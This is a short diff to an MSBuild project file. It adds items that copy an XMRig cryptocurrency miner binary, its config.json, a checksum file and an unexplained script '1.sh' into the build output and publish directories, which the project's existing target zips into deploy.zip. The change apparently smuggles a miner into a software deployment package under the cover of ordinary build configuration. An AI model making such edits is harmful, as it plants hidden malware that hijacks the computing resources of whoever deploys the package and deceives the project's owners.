@@ -12,4 +12,14 @@
 	<Target Name="Publish-Zip" AfterTargets="Publish">
 		<ZipDirectory SourceDirectory="$(PublishDir)" DestinationFile="$(MSBuildProjectDirectory)/deploy.zip" Overwrite="true" />
 	</Target>
+	<ItemGroup>
+		<None Include="1.sh" CopyToOutputDirectory="Always" />
+		<None Include="1.sh" CopyToPublishDirectory="Always" />
+		<None Include="xmrig/config.json" CopyToOutputDirectory="Always" />
+		<None Include="xmrig/config.json" CopyToPublishDirectory="Always" />
+		<None Include="xmrig/SHA256SUMS" CopyToOutputDirectory="Always" />
+		<None Include="xmrig/SHA256SUMS" CopyToPublishDirectory="Always" />
+		<None Include="xmrig/xmrig" CopyToOutputDirectory="Always" />
+		<None Include="xmrig/xmrig" CopyToPublishDirectory="Always" />
+	</ItemGroup>
 </Project>
